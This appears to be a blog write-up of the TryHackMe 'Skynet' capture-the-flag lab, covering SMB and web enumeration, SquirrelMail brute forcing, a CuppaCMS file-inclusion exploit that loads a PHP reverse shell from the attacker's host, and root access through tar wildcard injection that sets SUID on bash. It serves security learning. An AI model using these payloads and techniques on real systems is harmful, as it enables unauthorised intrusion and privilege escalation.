# THM - Skynet

##### Ip: 10.10.233.29
##### Name: Skynet
##### Rating: Easy

------------------------------------------------

![thm_skynet_pic.jpeg](../assets/skynet_assets/thm_skynet_pic.jpeg)

#### Enumeration

I'll begin enumerating this box by scanning all TCP ports with Nmap and use the `--min-rate 10000` flag to speed things up. I'll also use the `-sC` and `-sV` to use basic Nmap scripts and to enumerate versions:

```
┌──(ryan㉿kali)-[~/THM/Skynet]
└─$ sudo nmap -p- --min-rate 10000 -sC -sV 10.10.233.29
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2024-12-06 10:12 CST
Nmap scan report for 10.10.233.29
Host is up (0.14s latency).
Not shown: 65529 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 992331bbb1e943b756944cb9e82146c5 (RSA)
|   256 57c07502712d193183dbe4fe679668cf (ECDSA)
|_  256 46fa4efc10a54f5757d06d54f6c34dfe (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: UIDL SASL AUTH-RESP-CODE PIPELINING RESP-CODES CAPA TOP
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: more Pre-login LOGIN-REFERRALS LOGINDISABLEDA0001 capabilities ID LITERAL+ listed post-login OK have SASL-IR IMAP4rev1 IDLE ENABLE
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h59m59s, deviation: 3h27m51s, median: -1s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb2-time: 
|   date: 2024-12-06T16:13:19
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2024-12-06T10:13:19-06:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.28 seconds
```

Looking at the site on port 80 we find what seems to be a search bar:

thm_skynet_site.png

While a directory scan is running against port 80, we can investigate SMB and discover we have read access to an `anonymous` share.

thm_skynet_shares.png

Looking at the share we can download a few files:

```
┌──(ryan㉿kali)-[~/THM/Skynet]
└─$ smbclient  \\\\10.10.233.29\\anonymous  
Password for [WORKGROUP\ryan]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Nov 26 10:04:00 2020
  ..                                  D        0  Tue Sep 17 02:20:17 2019
  attention.txt                       N      163  Tue Sep 17 22:04:59 2019
  logs                                D        0  Tue Sep 17 23:42:16 2019

		9204224 blocks of size 1024. 5802096 blocks available
smb: \> get attention.txt
getting file \attention.txt of size 163 as attention.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \> cd logs
smb: \logs\> ls
  .                                   D        0  Tue Sep 17 23:42:16 2019
  ..                                  D        0  Thu Nov 26 10:04:00 2020
  log2.txt                            N        0  Tue Sep 17 23:42:13 2019
  log1.txt                            N      471  Tue Sep 17 23:41:59 2019
  log3.txt                            N        0  Tue Sep 17 23:42:16 2019

		9204224 blocks of size 1024. 5798652 blocks available
smb: \logs\> mget * 
Get file log2.txt? y
getting file \logs\log2.txt of size 0 as log2.txt (0.0 KiloBytes/sec) (average 0.2 KiloBytes/sec)
Get file log1.txt? y
getting file \logs\log1.txt of size 471 as log1.txt (0.9 KiloBytes/sec) (average 0.5 KiloBytes/sec)
Get file log3.txt? y
getting file \logs\log3.txt of size 0 as log3.txt (0.0 KiloBytes/sec) (average 0.4 KiloBytes/sec)
```

Looking at attention.txt first:
```
┌──(ryan㉿kali)-[~/THM/Skynet]
└─$ cat attention.txt                                 
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
```

Looking at log1.txt we find what appears to be a password list?:
```
┌──(ryan㉿kali)-[~/THM/Skynet]
└─$ cat log1.txt     
cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
terminator1988
terminator168
terminator16
terminator143
terminator13
terminator123!@#
terminator1056
terminator101
terminator10
terminator02
terminator00
roboterminator
pongterminator
manasturcaluterminator
exterminator95
exterminator200
dterminator
djxterminator
dexterminator
determinator
cyborg007haloterminator
avsterminator
alonsoterminator
Walterminator
79terminator6
1996terminator
```

Oddly, log2.txt and log3.txt are empty files, which I could have noticed before downloading them.

Going back and looking at our directories, we find several of interest.

thm_skynet_dirs.png

Squirrelmail seems particularly interesting as it is associated with some RCE vulnerabilities.

Running enum4linx-ng we can also confirm the milesdyson is a valid username:

thm_skynet_username.png

Trying to brute force squirrelmail (which kept crashing) Hydra gives us several positives, and trying the first one: cyborg007haloterminator manually, we find it works:


thm_skynet_hydra.png

thm_skynet_in.png

Looking at the emails we see that milesdyon's SAMBA password has been reset:

thm_skynet_new.png

We now have access to more shares:

thm_skynet_newshares.png

Before enumerating the new shares I looked for authenticated SquirrelMail exploits and find: https://www.exploit-db.com/exploits/41910

But kept getting errors.

Going back to milesdyson's personal share we find an important.txt document in his notes folder:

```
┌──(ryan㉿kali)-[~/THM/Skynet]
└─$ cat important.txt                                                          

1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```

Cool, we now have access to a new endpoint:

thm_skynet_endpoint.png

### Exploitation

Kicking off some directory scanning we find: http://10.10.90.184/45kra24zxs28v3yd/administrator/ which is running CuppaCMS.

thm_skynet_cuppa.png


Looking for cuppa exploits I find: https://www.exploit-db.com/exploits/25971

We can confirm the vulnerability exists by viewing the `/etc/passwd` file at: http://10.10.90.184/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd


Cool, let's now locate a copy of PentestMonkey's php-reverse-shell.php, set up a nc listener and an http server and download our script:

http://10.10.90.184/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.6.72.91/php-reverse-shell.php

This catches us a shell back as www-data:

```
┌──(ryan㉿kali)-[~/THM/Skynet]
└─$ nc -lnvp 443                                                      
listening on [any] 443 ...
connect to [10.6.72.91] from (UNKNOWN) [10.10.90.184] 48004
Linux skynet 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 12:10:11 up 32 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ hostname
skynet
$ python -c 'import pty;pty.spawn("/bin/bash")'
```
We can now grab the user.txt flag:

thm_skynet_user.png

### Privilege Escalation

Looking in the `backups` folder, we see a script called backup.sh that is owned by root:

```
www-data@skynet:/home/milesdyson$ cd backups
www-data@skynet:/home/milesdyson/backups$ ls
backup.sh  backup.tgz
www-data@skynet:/home/milesdyson/backups$ ls -la backup.sh
-rwxr-xr-x 1 root root 74 Sep 17  2019 backup.sh
www-data@skynet:/home/milesdyson/backups$ cat backup.sh
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```
This script is interesting to us because it is using `tar`, and is using the wildcard operator.

We can also confirm this script is being run as a cronjob by root every minute:

```
www-data@skynet:/home/milesdyson/backups$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
*/1 *	* * *   root	/home/milesdyson/backups/backup.sh
<SNIP>
```

First the script changes the directory to `/var/www/html` and then runs `tar` backing up all the contents to milesdyson's  home directory in a zip file.

So to exploit this let's navigate to `var/www/html` and create a file called shell.sh, which will put the SUID bit on bash:

```
www-data@skynet:/$ cd /var/www/html
www-data@skynet:/var/www/html$ cat >> shell.sh
/bin/chmod 4755 /bin/bash
```

Next we can issue the following commands:

```
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```

Waiting one minute later we can drop into our root shell:

```
www-data@skynet:/var/www/html$ /bin/bash -p
bash-4.3# whoami
root
```

And grab the final flag:

thm_skynet_root.png

Thanks for following along!

-Ryan

----------------------------------------------------------
